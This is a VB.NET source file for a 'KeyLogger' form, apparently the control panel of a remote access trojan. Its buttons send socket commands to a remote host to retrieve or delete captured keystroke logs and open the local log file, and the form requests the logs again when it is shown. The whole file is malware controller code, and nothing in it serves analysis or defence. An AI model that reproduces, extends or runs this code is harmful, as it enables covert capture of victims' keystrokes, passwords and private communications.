Public Class KeyLogger
    Public sock As Integer

    Private Sub RefreshButton_Click(sender As Object, e As EventArgs) Handles RefreshButton.Click
        Main.S.Send(sock, Main.n.getklog) ''get keylogger logs
    End Sub

    Private Sub ClearButton_Click(sender As Object, e As EventArgs) Handles ClearButton.Click
        Main.S.Send(sock, Main.n.delklog) ''delete from host
    End Sub

    Private Sub OpenButton_Click(sender As Object, e As EventArgs) Handles OpenButton.Click
        Process.Start(Main.klf)
    End Sub

    Private Sub KeyLogger_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
        WebBrowser.Navigate("about:blank")
        Main.S.Send(sock, Main.n.getklog) ''get keylogger logs
    End Sub
End Class